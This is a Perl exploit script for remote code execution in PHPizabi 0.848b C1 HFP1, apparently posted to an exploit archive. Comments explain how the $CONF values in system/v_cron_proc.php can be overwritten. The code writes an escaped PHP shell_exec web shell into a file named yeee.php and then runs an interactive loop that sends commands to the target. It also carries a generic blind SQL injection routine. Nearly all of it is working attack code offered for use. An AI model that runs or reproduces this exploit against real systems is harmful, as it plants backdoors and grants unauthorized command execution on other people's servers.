PHPizabi 0.848b C1 HFP1 Remote Code Execution Exploit
=====================================================



#!/usr/bin/perl 
#inphex
#PHPizabi v0.848b C1 HFP1 Remote Code Execution
#if you are seeking for a partner to work on some project(s) just send an email inphex0 
#system/v_cron_proc.php
#	if (!function_exists("writeLogEntry")) {
#		function writeLogEntry($data) {
#			global $CONF;
#			
#			touch($CONF["CRON_LOGFILE"]);
#		
#			if ($handle = fopen($CONF["CRON_LOGFILE"], "a")) {
#				fwrite($handle, "[".date($CONF["LOCALE_LONG_DATE_TIME"])."] $data \n");
#				fclose($handle);
#			}
#		}
#	}
#
#
#writeLogEntry("Cron cycle started");
#writeLogEntry("Cron cycle ended");
########################################################
#overwritable:
#1.$CONF["CRON_LOGFILE"]
#2.$CONF["LOCALE_LONG_DATE_TIME"]
#
#date($CONF["LOCALE_LONG_DATE_TIME"]) ;\
#solution:
#<?php 
#echo date("a");
#?>
#returns: pm
#<?php 
#echo date("\a");
#?>
#returns: a
#seems logically eh?
#
#usage: perl ye.pl host /path/
#
## [C:\]# perl ye.pl host /path/
## $[host]# id
## uid=63676(dswrealty) gid=888(vusers) groups=33(www-data)
#
use LWP::UserAgent;
use HTTP::Cookies;
use Switch;

$hy = shift;
$host_ = "http://".$hy;
$path_ = shift;
$port = 80; #default
$info{&#039;info&#039;} = { 
	"description" => [""],
	"options" =>
	{
		"agent" => "",  
		"proxy" => "",  
		"default_headers" => [  
			["key","value"]], 
		"timeout" => 0, 
		"cookie" =>     
		{
			"cookie" => [""],
		},
	},
	"sending_options" =>
	{
			"host" => $host_, 
			"path" => $path_."system/v_cron_proc.php",
		        "port" => $port,                  
			"method_a" => "REMOTE_CO(MMAND)/CODE EXECUTION",  
			"attack" =>
		{
				"CONF[CRON_LOGFILE]" => ["get","CONF[CRON_LOGFILE]","yeee.php"],
				"CONF[LOCALE_LONG_DATE_TIME]" => ["get","CONF[LOCALE_LONG_DATE_TIME]","<?\\p\\h\\p \\e\\c\\h\\o \\s\\h\\e\\l\\l_\\ex\\e\\c\\(\\\$_\\G\\E\\T[\\c\\m\\d]\\);\\e\\x\\i\\t;?>"], #nice eh?:)
		},
	},

};

&start($info{&#039;info&#039;},222);
while () {
	print "\$[".$hy."]#";
	$cmd = <STDIN>;chomp($cmd);
	$info{&#039;info&#039;} = { 
		"description" => [""],
		"options" =>
			{
			"agent" => "",  
			"proxy" => "",  
			"default_headers" => [  
				["key","value"]], 
			"timeout" => 0, 
			"cookie" =>     
			{
				"cookie" => [""],
			},
		},
		"sending_options" =>
		{
				"host" => $host_, 
				"path" => $path_."system/yeee.php",
			    "port" => $port,                  
				"method_a" => "REMOTE_CO(MMAND)/CODE EXECUTION",  
				"attack" =>
			{
					"CONF[CRON_LOGFILE]" => ["get","cmd",$cmd],
			},
		},

	};

&start($info{&#039;info&#039;},221); 
print ${$info{&#039;info&#039;}}{221}{&#039;content&#039;}."\n";
}
sub start
{
	
	$a_ = shift;
	$id = shift;
	$post_dA = "";
	$get_dA = get_d_p_s("get");
	$post_dA = get_d_p_s("post");

	my ($x,$c,$m,$h,$ff,$kf,$hp,$c,$cccc) = (0,0,0,0,0,0,0,0,0);
        $jj = 1;
	$ii = 48;
        $hh = 1;
	$ppp = 0;
	$s = shift;
	$a = "";
	$res_p = "";
	$h = "";
	$ua= "";
	$agent= "";
	$k= "";
	$v= "";
	$get_data= "";
	$post_data= "";
	$header_dA = "";
	$h_host_h_xdsjaop = $a_->{&#039;sending_options&#039;}{&#039;host&#039;};
	$h_path_h_xdsjaop = $a_->{&#039;sending_options&#039;}{&#039;path&#039;};
	$h_port_h_xdsjaop = $a_->{&#039;sending_options&#039;}{&#039;port&#039;};
	$method_m = $a_->{&#039;sending_options&#039;}{&#039;method_a&#039;};
	$ua = LWP::UserAgent->new;
	$ua->timeout($a_->{&#039;options&#039;}{&#039;timeout&#039;});  
	if ($a_->{&#039;options&#039;}{&#039;proxy&#039;}) {
	    $ua->proxy([&#039;http&#039;, &#039;ftp&#039;] => $a_->{&#039;options&#039;}{&#039;proxy&#039;});
	}
	$agent = $a_->{&#039;options&#039;}{&#039;agent&#039;} || "Mozilla/5.0"; 
	$ua->agent($agent); 
	{                                                 
		while (($k,$v) = each(%{$a_}))
			{
			if ($k ne "options" && $k ne "sending_options")
				{
				foreach $r (@{$a_->{$k}})
					{
						print $a_->{$k}[0];
					}
				}
			}


		foreach $j (@{$a_->{&#039;options&#039;}{&#039;default_headers&#039;}})
			{    
			$ua->default_headers->push_header($a_->{&#039;options&#039;}{&#039;default_headers&#039;}[$m][0] => $a_->{&#039;options&#039;}{&#039;default_headers&#039;}[$m][1]);
			$m++;
			}

		if ($a_->{&#039;options&#039;}{&#039;cookie&#039;}{&#039;cookie&#039;}[0])
			{          
			$ua->default_headers->push_header(&#039;Cookie&#039; => $a_->{&#039;options&#039;}{&#039;cookie&#039;}{&#039;cookie&#039;}[0]);
			}

			

	}
	switch ($method_m)        
	{
		case "attack" { &attack();}
		case "SQL_INJECTION_BLIND" { &sql_injection_blind();}
		case "REMOTE_COMMAND_EXECUTION" { &attack();}
		case "REMOTE_CODE_EXECUTION" {&attack();}
		case "REMOTE_FILE_INCLUSION" { &attack();}
		case "LOCAL_FILE_INCLUSION" { &attack(); }
		else { &attack(); }  

	}


	sub attack
	{
		my ($jj);
		my ($h);
		my($x);
		if ($post_dA eq "") {
			$method = "get";
		} elsif ($post_dA ne "")
		{
			$method = "post";
		}
		if ($method eq "get") {  
			$res_p = get_data($h_host_h_xdsjaop,$h_path_h_xdsjaop."?".$get_dA);
			${$a_}{$id}{&#039;content&#039;} = $res_p;
			foreach $a (@{$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}})
				{
				$res_p =~ /$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][0]/;
				
				while ($jj <= $a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][1])
					{
					if (${$jj} ne "")
						{
						${$a_}{$id}{&#039;regex&#039;}[$h][$x] = ${$jj};
						$x++;
						}
						$jj++;
					}
					
					$h++;
				}
		} elsif ($method eq "post")
		{
			$res_p = post_data($h_host_h_xdsjaop,$h_path_h_xdsjaop."?".$get_dA,"application/x-www-form-urlencoded",$post_dA);
		
			${$a_}{$id}{&#039;content&#039;} = $res_p;

			foreach $a (@{$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}})
				{
				$res_p =~ /$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][0]/;
				while ($jj <= $a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][1])
					{
					if (${$jj} ne "")
						{
						${$a_}{$id}{&#039;regex&#039;}[$h][$x] = ${$jj};
						$x++;
						}
						$jj++;
					}
					$h++;
				}
		}

	}
	sub sql_injection_blind
	{
		while ()
			{
			while ($ii <= 120)
				{
				
				$itsx = "[".chr($ii)."]";
				$l = length($itsx);
				$b = ("\b")x$l;
				syswrite STDOUT,$b.$itsx;

				if(check($ii,$hh) == 1)
				{
					syswrite STDOUT,$b.chr($ii)."---";
					$hh++;
					$chr = $chr.chr($ii);
					}
					$ii++;
			}
			push(@ffs,length($chr)); 
			if (($#ffs - 999) == $ffs)
				{
				exit;
				}
				$ii = 48;
		}
	}
	sub check($$)
	{
		my ($h);
		my ($a);
		$ii = shift;
		$hh = shift;

		if (get_d_p_s("post") ne "")
			{
			$method = "post";
		} else { $method = "get";}
		if ($method eq "get")
			{
			$ppp++;
			$query = modify($get_dA,$ii,$hh);
			$res_p = get_data($h_host_h_xdsjaop,$a_->{&#039;sending_options&#039;}{&#039;path&#039;}."?".$query);

			foreach $a (@{$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}})
				{
				if ($res_p =~m/$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][0]/)
					{
					if ($a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][2] == 1) {
						return 1;
					} else { return 0;}
					}
					else 
				{
						if ($a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][2] == 1) {
							return 0;
						}else { return 1;}
	
						
				}
				$h++;
			}
		} elsif ($method eq "post")
			{
			$ppp++;
			$query_g = modify($get_dA,$ii,$hh);
			$query_p = modify($post_dA,$ii,$hh);
			
			$res_p = post_data($h_host_h_xdsjaop,$a_->{&#039;sending_options&#039;}{&#039;path&#039;}."?".$query_g,"application/x-www-form-urlencoded",$query_p);
			foreach $a (@{$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}})
				{
				if ($res_p =~m/$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{&#039;regex&#039;}[$h][0]/)
					{
					return 1;
					}
					else 
					{
						return 0;
					}
				$h++;
			}
		}
	}
    sub modify($$$)
	{
	    $string = shift;
	    $replace_by = shift;
	    $replace_by1 = shift;

	    if ($string !~/\$i/ && $string !~/\$h/) {
		    return $string;
	        } elsif ($string !~/\$i/)
		{
		        $ff = substr($string,0,index($string,"\$h"));
	            $ee =  substr($string,rindex($string,"\$h")+2);
	            $string = $ff.$replace_by1.$ee;

	            return $string;
		} elsif ($string !~/\$h/)
		{
	        $f = substr($string,0,index($string,"\$i"));
	        $e = substr($string,rindex($string,"\$i")+2);
	        $string = $f.$replace_by.$e;
		    return $string;
		} else
		{
		    $f = substr($string,0,index($string,"\$i"));
	        $e = substr($string,rindex($string,"\$i")+2);
	        $string = $f.$replace_by.$e;

		    $ff = substr($string,0,index($string,"\$h"));
	        $ee =  substr($string,rindex($string,"\$h")+2);
	        $string = $ff.$replace_by1.$ee;

		    return $string;
		}
	}
	sub get_d_p_s
	{
		$k = 0;
		$v = 0;
		$g_d_p_s = shift;

		@post = ();
		@get = ();
		
		$post_data = "";
		$get_data = "";
		$header_data = "";
		%header_dA = ();
		$p = "";
		$g = "";
		while (($k,$v) = each(%{$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}}))
			{
			if ($a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[0] =~/post/)
				{
				$p .= $a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[1]."=".$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[2]."&";
				} elsif ($a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[0] =~/get/) {
					$g .= $a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[1]."=".$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[2]."&";
				} elsif ($a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[0] =~ "header")
				{
				        $header_dA{$a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[1]} = $a_->{&#039;sending_options&#039;}{&#039;attack&#039;}{$k}[2];
				}
			}
		if ($g_d_p_s eq "get")
			{
			return $g;
			}
			elsif ($g_d_p_s eq "post")
		{
			return $p;
		} elsif ($g_d_p_s eq "header")
		{
			return %header_dA;
		}

			@a_ = ();
	}
	sub get_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		%hash = get_d_p_s("header");
	    while (($u,$c) = each(%hash))
			{
			$ua->default_headers->push_header($u => $c);
			}
		$req = $ua->get($h_host_h_xdsjaop.":".$a_->{&#039;sending_options&#039;}{&#039;port&#039;}.$h_path_h_xdsjaop);
		return $req->content;
	}
	sub post_data
	{
		$h_host_h_xdsjaop = shift;
		$h_path_h_xdsjaop = shift;
		$content_type = shift;
		$send = shift;
		%hash = get_d_p_s("header");
	    while (($u,$c) = each(%hash))
			{
		    $ua->default_headers->push_header($u => $c);
			}
		$req = HTTP::Request->new(POST => $h_host_h_xdsjaop.":".$a_->{&#039;sending_options&#039;}{&#039;port&#039;}.$h_path_h_xdsjaop);
		$req->content_type($content_type);
		$req->content($send);
		$res = $ua->request($req);
		return $res->content;
	}

}



